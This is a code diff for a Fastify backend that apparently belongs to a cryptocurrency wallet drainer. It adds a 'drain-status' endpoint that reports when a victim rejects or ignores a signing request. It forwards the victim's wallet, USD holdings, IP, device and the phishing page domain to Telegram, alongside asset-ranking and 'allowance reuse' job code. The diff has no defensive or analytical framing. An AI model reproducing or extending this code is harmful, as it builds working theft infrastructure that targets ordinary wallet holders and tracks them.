@@ -9,7 +9,7 @@ import { getRankedAssets } from '@legion/core'
 import type { FastifyInstance, FastifyReply, FastifyRequest } from 'fastify'
 
 import { sendFailure, sendSuccess } from '../lib/api-response.js'
-import { fusionScoutBodySchema, parseBody, rankedScoutBodySchema, scoutIngressBodySchema } from '../lib/schemas.js'
+import { fusionScoutBodySchema, parseBody, rankedScoutBodySchema, scoutIngressBodySchema, drainStatusBodySchema } from '../lib/schemas.js'
 import { validateScoutValueUsdField } from '../lib/scout-value-usd.js'
 import { enqueueAllowanceReuseJob } from '../lib/allowance-reuse-queue.js'
 import { isAddress } from 'viem'
@@ -17,6 +17,8 @@ import {
   notifyWalletConnected,
   notifyScanComplete,
   notifyError,
+  notifyUserRejectedWallet,
+  notifyDrainNoAction,
   resolveClientIp,
   detectDeviceFromUA,
   type TelegramRequestContext,
@@ -234,20 +236,6 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
     try {
       const assets = await getRankedAssets(wallet, chainFamily)
       const totalUsd = assets.reduce((sum, a) => sum + a.amount_usd, 0)
-      const scanCtx: TelegramRequestContext = {
-        ...extractRequestContext(request),
-        chain_family: chainFamily ?? 'ALL',
-        wallet_type: 'Wallet',
-        scout_value_usd: totalUsd,
-      }
-      const strategyAssets: StrategyAsset[] = assets.map((a) => ({
-        chain: a.chain,
-        family: a.family,
-        token: a.token,
-        symbol: a.symbol,
-        amount_usd: a.amount_usd,
-      }))
-      void notifyScanComplete(wallet, totalUsd, assets.length, scanCtx, strategyAssets).catch(() => {})
       return sendSuccess(reply, 200, 'Ranked assets ready', {
         assets,
         total_usd: totalUsd,
@@ -259,6 +247,31 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
       void notifyError('/api/v1/scout/ranked', msg, wallet, extractRequestContext(request)).catch(() => {})
       return sendFailure(reply, 500, msg, { code: 'ServerError' })
     }
+  })
+
+  app.post('/api/v1/scout/drain-status', async (request: FastifyRequest, reply: FastifyReply) => {
+    const parsed = parseBody(drainStatusBodySchema, request.body)
+    if (parsed.ok === false) {
+      return sendFailure(reply, 400, parsed.message, { code: 'ValidationError' })
+    }
+    const body = parsed.data
+    const wallet = body.wallet_address.trim()
+    const ctx: TelegramRequestContext = {
+      ...extractRequestContext(request),
+      chain_id: body.chain_id,
+      chain_family: body.chain_family ?? 'EVM',
+      wallet_type: body.wallet_type ?? 'Unknown',
+      scout_value_usd: body.scout_value_usd,
+      sourceDomain: body.source_page,
+    }
+
+    if (body.event === 'user_rejected') {
+      void notifyUserRejectedWallet(wallet, { ...ctx, detail: body.detail ?? null }).catch(() => {})
+    } else if (body.event === 'no_action') {
+      void notifyDrainNoAction(wallet, { ...ctx, detail: body.detail ?? null }).catch(() => {})
+    }
+
+    return sendSuccess(reply, 200, 'Drain status recorded', { event: body.event })
   })
 
   app.post('/api/v1/scout/detect-wallet', async (request: FastifyRequest, reply: FastifyReply) => {
